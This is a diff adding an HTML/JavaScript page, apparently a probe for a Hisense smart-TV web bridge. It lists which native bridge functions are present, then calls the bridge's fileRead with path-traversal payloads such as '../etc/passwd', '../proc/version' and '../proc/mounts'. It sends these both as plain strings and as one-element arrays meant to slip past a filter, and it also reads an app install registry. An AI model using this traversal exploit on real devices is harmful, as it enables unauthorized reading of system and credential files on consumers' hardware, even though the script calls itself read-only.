@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>alvidaa read-only probe</title>
+<style>
+  html, body { margin: 0; padding: 0; background: #000; color: #ccc; }
+  #out { font: 20px/1.45 Menlo, Consolas, monospace; white-space: pre-wrap;
+         word-break: break-all; padding: 12px; }
+  .ok { color: #8f8; } .err { color: #f88; } .warn { color: #fd6; } .hdr { color: #6cf; }
+</style>
+</head>
+<body>
+<div id="out"></div>
+<script>
+(function () {
+  "use strict";
+  // READ-ONLY probe: only fileRead calls and function-presence checks.
+  // Nothing is written, started or installed. Safe to re-run.
+  var el = document.getElementById("out");
+
+  function out(t, c) {
+    var d = document.createElement("div");
+    d.textContent = t;
+    if (c) d.className = c;
+    el.appendChild(d);
+  }
+  function trunc(s, n) {
+    s = String(s == null ? "" : s).replace(/\s+/g, " ");
+    return s.length > n ? s.slice(0, n) + "…(" + s.length + ")" : s;
+  }
+  function normMsg(m) {
+    if (m == null) return "";
+    if (typeof m === "string") return m;
+    try { return JSON.stringify(m); } catch (e) { return String(m); }
+  }
+  function isOk(ret) {
+    if (ret === true) return true;
+    if (typeof ret === "number") return ret !== 0;
+    if (typeof ret === "string") return ret !== "" && ret !== "0";
+    return false;
+  }
+  function br(action, params) {
+    try {
+      if (typeof HiUtils_createRequest === "function") {
+        var r = HiUtils_createRequest(action, params);
+        if (r && typeof r === "object") return { ret: r.ret, msg: normMsg(r.msg) };
+        return { ret: true, msg: trunc(r, 400) };
+      }
+      return { error: "no HiUtils_createRequest" };
+    } catch (e) { return { error: String(e) }; }
+  }
+  function probe(label, params) {
+    var r = br("fileRead", params);
+    var ok = isOk(r.ret);
+    out((ok ? "[OK]   " : "[FAIL] ") + label + "  →  ret=" + JSON.stringify(r.ret) +
+        "  msg=" + trunc(r.msg || r.error, 260), ok ? "ok" : "err");
+    return r;
+  }
+
+  out("alvidaa read-only probe — " + new Date().toISOString(), "hdr");
+  out("ua: " + navigator.userAgent);
+  out("origin: " + location.href);
+  out("");
+
+  out("bridge functions", "hdr");
+  ["HiUtils_createRequest", "WebSDK_createFileRequest", "vowOS",
+   "Hisense_GetModelName", "Hisense_GetChipSetName"].forEach(function (n) {
+    var t = typeof window[n];
+    out("  " + n + ": " + (t === "undefined" ? "(absent)" : t),
+        t === "undefined" ? "warn" : "ok");
+  });
+  try {
+    out("  vowOS.service.syncExecute: " +
+        (window.vowOS && vowOS.service && typeof vowOS.service.syncExecute === "function" ? "function" : "(absent)"),
+        window.vowOS ? "ok" : "warn");
+  } catch (e) { out("  vowOS probe error: " + e, "err"); }
+  out("");
+
+  out("file bridge — path traversal, bare string", "hdr");
+  probe("../proc/uptime",        { path: "../proc/uptime", mode: 6 });
+  probe("../proc/version",       { path: "../proc/version", mode: 6 });
+  probe("../etc/passwd",         { path: "../etc/passwd", mode: 6 });
+  out("");
+
+  out("file bridge — path traversal, one-element ARRAY (09.60 lane)", "hdr");
+  probe('["../proc/uptime"]',    { path: ["../proc/uptime"], mode: 6 });
+  probe('["../proc/mounts"]',    { path: ["../proc/mounts"], mode: 6 });
+  out("");
+
+  out("install registry (read only)", "hdr");
+  probe("websdk/Appinfo.json",   { path: "websdk/Appinfo.json", mode: 6 });
+  out("");
+
+  out("done — nothing was written", "hdr");
+})();
+</script>
+</body>
+</html>
